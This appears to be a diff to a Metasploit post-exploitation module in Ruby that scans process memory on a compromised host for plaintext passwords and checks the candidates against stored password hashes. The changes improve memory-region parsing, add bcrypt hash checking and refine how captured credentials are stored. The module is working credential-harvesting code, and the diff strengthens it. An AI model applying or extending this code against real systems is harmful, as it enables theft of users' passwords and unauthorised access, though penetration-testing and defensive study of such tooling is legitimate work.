@@ -151,7 +151,7 @@ class MetasploitModule < Msf::Post
     updated_regions = mem_regions.clone
     mem_regions.each do |region|
       address = region['start']
-      addr_line = lines.select { |line| line.include?(address.to_s(16)) }
+      addr_line = lines.select { |line| line.start_with?(address.to_s(16)) }
       next if addr_line.empty?
 
       addr_line = addr_line.first
@@ -168,7 +168,7 @@ class MetasploitModule < Msf::Post
       start_addr = start_addr.to_i(16)
       end_addr = end_addr.to_i(16)
 
-      length = (end_addr - start_addr) / 2
+      length = end_addr - start_addr
       updated_regions << { 'start' => start_addr, 'length' => length }
     end
 
@@ -208,7 +208,8 @@ class MetasploitModule < Msf::Post
         when 'md5'
           hashed = UnixCrypt::MD5.build(str, salt)
         when 'blowfish'
-          # bcrypt?
+          BCrypt::Engine.cost = pass_info['cost'] || 12
+          hashed = BCrypt::Engine.hash_secret(str, hash[0..28])
         when 'sha256'
           hashed = UnixCrypt::SHA256.build(str, salt)
         when 'sha512'
@@ -265,7 +266,7 @@ class MetasploitModule < Msf::Post
 
     captured_strings = []
     target_proc_info.each do |info|
-      print_status("Checking matches for process #{info['name']}")
+      print_status("Checking for matches in process #{info['name']}")
       match_set = get_matches(info)
       if match_set.empty?
         vprint_status("No matches found for process #{info['name']}")
@@ -284,12 +285,14 @@ class MetasploitModule < Msf::Post
     end
 
     results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
+    fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?
+
     print_good("Found #{results.length} valid credential(s)!")
     results.each do |res|
       store_valid_credential(
         user: res['username'],
         private: res['password'],
-        private_type: 'password'
+        private_type: :password
       )
     end
   end
